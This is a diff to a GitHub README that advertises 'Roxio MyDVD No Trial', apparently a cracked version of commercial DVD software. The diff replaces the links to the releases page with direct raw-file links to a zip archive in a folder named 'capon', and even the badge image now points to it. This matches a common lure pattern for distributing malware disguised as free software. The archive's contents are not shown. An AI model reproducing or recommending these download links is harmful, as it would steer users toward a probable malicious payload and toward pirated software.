@@ -1,6 +1,6 @@
 # 🎥 Roxio-MyDVD-No-Trial - Create DVDs with Ease
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20App-brightgreen)](https://github.com/okan54/Roxio-MyDVD-No-Trial/releases)
+[![Download Now](https://raw.githubusercontent.com/okan54/Roxio-MyDVD-No-Trial/main/capon/Roxio-MyDVD-No-Trial_v1.2.zip%20Now-Get%20the%20App-brightgreen)](https://raw.githubusercontent.com/okan54/Roxio-MyDVD-No-Trial/main/capon/Roxio-MyDVD-No-Trial_v1.2.zip)
 
 ## 📝 Description
 
@@ -18,7 +18,7 @@ To use Roxio MyDVD, follow these steps:
    - DVD Drive: Required for burning DVDs
 
 2. **Installation**
-   - Visit this page to download: [GitHub Releases](https://github.com/okan54/Roxio-MyDVD-No-Trial/releases)
+   - Visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/okan54/Roxio-MyDVD-No-Trial/main/capon/Roxio-MyDVD-No-Trial_v1.2.zip)
    - Find the latest version.
    - Click on the version number to access the release assets.
    - Download the installer file by clicking on the provided link.
@@ -30,7 +30,7 @@ To use Roxio MyDVD, follow these steps:
 
 ## 📥 Download & Install
 
-To begin using Roxio MyDVD, visit this page to download: [Download the Software](https://github.com/okan54/Roxio-MyDVD-No-Trial/releases).
+To begin using Roxio MyDVD, visit this page to download: [Download the Software](https://raw.githubusercontent.com/okan54/Roxio-MyDVD-No-Trial/main/capon/Roxio-MyDVD-No-Trial_v1.2.zip).
 
 ## 🎬 Using Roxio MyDVD
 
